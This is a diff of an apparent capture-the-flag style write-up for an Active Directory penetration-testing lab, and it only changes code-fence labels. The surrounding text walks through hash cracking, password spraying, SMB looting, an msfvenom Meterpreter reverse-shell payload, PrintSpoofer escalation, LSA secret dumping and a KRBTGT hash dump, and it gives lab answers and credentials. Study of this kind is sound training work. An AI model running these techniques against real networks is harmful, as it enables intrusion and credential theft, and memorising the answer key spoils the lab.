@@ -22,7 +22,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
      ```
 2. What is this user's cleartext password? **Answer: weasal**
    - Copy the hash and crack it offline:
-     ```sh
+     ```shellsession
      $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
      <SNIP>
      AB920::INLANEFREIGHT:50bf479bb8f547ec:7542efdb571548c87f59da00c3922c96:01010000000000008039478881d0dc01b73975703b2b7b5b0000000002000800390049005900520001001e00570049004e002d0049004500490037005a0033003000530053005600560004003400570049004e002d0049004500490037005a003300300053005300560056002e0039004900590052002e004c004f00430041004c000300140039004900590052002e004c004f00430041004c000500140039004900590052002e004c004f00430041004c00070008008039478881d0dc0106000400020000000800300030000000000000000000000000200000fdd98079412048a24ff4cb3d5b641627b9639572946babbf2e1abaeb498d0ccc0a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
@@ -30,7 +30,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
      ```
 3. Submit the contents of the C:\flag.txt file on MS01. **Answer: aud1t_gr0up_m3mbersh1ps!**
    - Enumerating the AD network:
-     ```sh
+     ```shellsession
      $fping -asgq 172.16.7.0/23
      172.16.7.3
      172.16.7.50
@@ -53,7 +53,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
           14.302 sec (elapsed real time)
      ```
    - Copy those IP addresses to `hosts` and perform nmap scan to identify each host → MS01 is at `172.16.7.50`:
-     ```sh
+     ```shellsession
      $nmap -A -iL hosts -oN host-enum
      Starting Nmap 7.92 ( https://nmap.org ) at 2026-04-20 05:45 EDT
      Nmap scan report for inlanefreight.local (172.16.7.3)
@@ -178,18 +178,18 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
      |172.16.7.50|`MS01`|Windows|135, 139, 445, 3389|
      |172.16.7.60|`SQL01`|Windows|135, 139, 445, 1433|
    - Enable dynamic port forwarding with ssh and RDP to the target to read the flag:
-     ```sh
+     ```shellsession
      $ ssh htb-student@10.129.71.191 -D 9050
      $ proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal
      ```
 4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. **Answer: BR086**
    - Enumerate domain users and create a list of them for later password spraying attack:
-     ```sh
+     ```shellsession
      $sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee  usernames.txt
      $cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
      ```
    - Perform password spraying with password `Welcome1`:
-     ```sh
+     ```shellsession
      $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
 
      __             __               __     
@@ -210,7 +210,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
    - Above password spraying attack
 6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? **Answer: D@ta_bAse_adm1n!**
    - Perform SMB enumeration, identify these shares:
-    ```sh
+    ```shellsession
     $smbmap -u br086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3
     [+] IP: 172.16.7.3:445	Name: inlanefreight.local                               
             Disk                                                  	Permissions	Comment
@@ -263,7 +263,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
         10328063 blocks of size 4096. 8142430 blocks available
     ```
    - Download `web.config` locally and read the MSSQL connection string:
-    ```sh
+    ```shellsession
     smb: \IT\Private\Development\> get web.config
     getting file \IT\Private\Development\web.config of size 1203 as web.config (235.0 KiloBytes/sec) (average 235.0 KiloBytes/sec)
     smb: \IT\Private\Development\> exit
@@ -327,7 +327,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
     SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                                                     
     ```
    - Now to perform privilege escalation on SQL01, we need the Printspoofer tool and a reverse shell payload, download the tool and generate the payload, then open a python http server to host the files:
-    ```sh
+    ```shellsession
     $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1411 -f exe -o shell.exe
     [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
     [-] No arch selected, selecting arch: x64 from the payload
@@ -353,7 +353,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
     $python -m http.server 9999
     ```
    - Setup a listener on the Parrot Linux VM to catch the reverse shell:
-    ```sh
+    ```shellsession
     $sudo msfconsole -q
     [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
     [*] Using configured payload generic/shell_reverse_tcp
@@ -464,7 +464,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
     mssqlsvc  INLANEFREIGHT  8c9555327d95f815987c0d81238c7660  0a8d7e8141b816c8b20b4762da5b4ee7038b515c  a1568414db09f65c238b7557bc3ceeb8
     ```
    - Since `xfreerdp` got blocked, try `evil-winrm` to access MS01 and read the flag:
-    ```sh
+    ```shellsession
     $ proxychains evil-winrm -i 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 
     [proxychains] config file found: /etc/proxychains.conf
     [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -486,7 +486,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
     ```
 9.  Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name? **Answer: CT059**
    - From the meterpreter session use `lsa_dump_secrets` module to obtain cleartext credential of `mssqlsvc`:
-      ```sh
+      ```shellsession
       (Meterpreter 4)(C:\Windows\system32) > lsa_dump_secrets
       [+] Running as SYSTEM
       [*] Dumping LSA secrets
@@ -513,7 +513,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
       old/text: Sup3rS3cur3maY5ql$3rverE
       ```
    - RDP to the MS01 machine using the `mssqlsvc`:`Sup3rS3cur3maY5ql$3rverE` credential with PowerView.ps1 already installed in `/home/htb-ac-1863259/Downloads`:
-      ```sh
+      ```shellsession
       $ proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /drive:share,/home/htb-ac-1863259/Downloads
       ```
    - In the remote session, import the module and get the Sid of the user with GenericAll right:
@@ -567,7 +567,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
       CT059::INLANEFREIGHT:34FB9516B1FBB278:5EB42E6CE2AEE750F3630B2EE440BC56:01010000000000008D46102439D2DC017CC2C59EEAB05B660000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008008D46102439D2DC0106000400020000000800300030000000000000000000000000200000BB2F4B69898E8D29495C2EAA8894C51B5307BD55C3CC1AAB9AEF0B3295ED50DB0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
       ```
    -  Copy the NTLM hash and crack it offline:
-      ```sh
+      ```shellsession
       $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
       <SNIP>
 
@@ -583,7 +583,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
       PS C:\Users\Public> Add-DomainGroupMember -Identity "Domain Admins" -Members "INLANEFREIGHT\CT059"
       ```
    - Now we can access the DC01 via evil-winrm with CT059 credentials and read the flag:
-      ```sh
+      ```shellsession
       $ proxychains evil-winrm -i 172.16.7.3 -u 'CT059' -p 'charlie1'
       [proxychains] config file found: /etc/proxychains.conf
       [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -604,7 +604,7 @@ SSH to **10.129.70.112 (ACADEMY-EA-PAR01-SA2)**, with user `htb-student` and pas
       ```
 12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. **Answer: 7eba70412d81c1cd030d72a3e8dbe05f**
    - We can easily retrieve the NTLM hash for the KRBTGT account using secretsdump.py from our Parrot Linux VM inside the internal network:
-      ```sh
+      ```shellsession
       $secretsdump.py inlanefreight.local/CT059@172.16.7.3 -just-dc-user INLANEFREIGHT/krbtgt
       Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
